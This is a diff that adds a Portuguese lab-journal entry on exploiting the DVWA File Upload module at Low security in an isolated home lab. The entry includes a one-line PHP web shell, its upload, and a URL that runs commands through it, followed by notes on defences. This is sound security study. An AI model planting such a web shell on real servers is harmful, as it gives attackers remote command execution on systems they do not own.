@@ -2212,6 +2212,61 @@ Módulo CSRF fechado nesta sessão (2026-08-15): Low e Medium sem defesa eficaz 
 
 ---
 
+## Entrada #37 — File Upload (nível Low)
+
+**Data/hora:** 2026-08-16
+
+**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)
+
+### Objetivo / Propósito
+
+Primeira exploração do módulo **File Upload** do DVWA — perceber como um upload sem validação de tipo de ficheiro pode resultar em RCE (Remote Code Execution) direto, através de uma web shell.
+
+### Ação executada
+
+1. DVWA Security → Low. Módulo **File Upload** — formulário simples "Choose an image to upload" (Browse + Upload).
+2. **Web shell criada** no Kali:
+   ```
+   echo '<?php system($_GET["cmd"]); ?>' > ~/shell.php
+   ```
+3. Upload do `shell.php` através do formulário → confirmado: `../../hackable/uploads/shell.php succesfully uploaded!`
+4. **Execução:** visitado o URL do ficheiro carregado, com um comando no parâmetro `cmd`:
+   ```
+   http://192.168.10.101/hackable/uploads/shell.php?cmd=whoami
+   ```
+
+### Resultado
+
+A página devolveu `www-data` — o mesmo utilizador já identificado no Command Injection (Entrada #17). Confirma RCE completo: o servidor aceitou o ficheiro `.php` sem qualquer verificação, guardou-o numa pasta acessível pelo browser, e executou-o como código ao ser visitado — dando controlo para correr **qualquer** comando do sistema operativo através do parâmetro `cmd`.
+
+### Deduções e raciocínio (certos e corrigidos)
+
+- **Intuição inicial insuficiente:** a minha primeira ideia foi que o ficheiro seria "intercetado ou visto" antes de causar dano — não percebi, sem ajuda, que o problema real é o servidor **executar** o `.php` como código ao ser aberto no browser, e não apenas "guardá-lo". Só ficou claro com a explicação direta e a analogia da receção de encomendas (um cacifo que aceita um embrulho sem o verificar, que liberta controlo do edifício ao ser aberto).
+- **Ligação a conceitos já conhecidos:** o resultado (`www-data`) e o mecanismo de execução de comandos via parâmetro (`?cmd=`) são, na prática, o mesmo RCE do Command Injection — só muda o canal de entrada (um ficheiro carregado, em vez de um campo de texto).
+
+**Consigo explicar isto a alguém?**
+  Porque é que um upload sem validação de tipo de ficheiro pode dar controlo total do servidor: **Sim**, com ajuda da analogia da receção de encomendas — mas a intuição inicial (antes da explicação) estava errada.
+
+### Como nos podemos defender
+
+- **Validação do tipo de ficheiro no servidor** (nunca confiar só na extensão ou no nome — verificar o conteúdo real do ficheiro).
+- **Whitelist de extensões permitidas** (ex.: só `.jpg`, `.png`, `.gif`), rejeitando tudo o resto.
+- **Guardar os ficheiros carregados fora da pasta acessível pelo browser**, ou impedir a execução de scripts nessa pasta (ex.: configuração do servidor web a bloquear execução de PHP em `uploads/`).
+- **Renomear os ficheiros** ao guardá-los (nomes aleatórios), dificultando adivinhar o URL.
+
+### Domínios relacionados
+
+- **Security+ — D2 / D4:** validação de input em uploads; RCE via ficheiros maliciosos
+- **CEH — D5 (Web Application Hacking):** web shells como técnica clássica de pós-exploração
+- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
+- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)
+
+### Próximos passos
+
+- [ ] File Upload nível Medium → Impossible
+
+---
+
 ## Screenshots
 
 Os prints ilustrativos de cada dia de trabalho ficam guardados em `screenshots/AAAA-MM-DD/`, referenciados a partir da entrada correspondente.
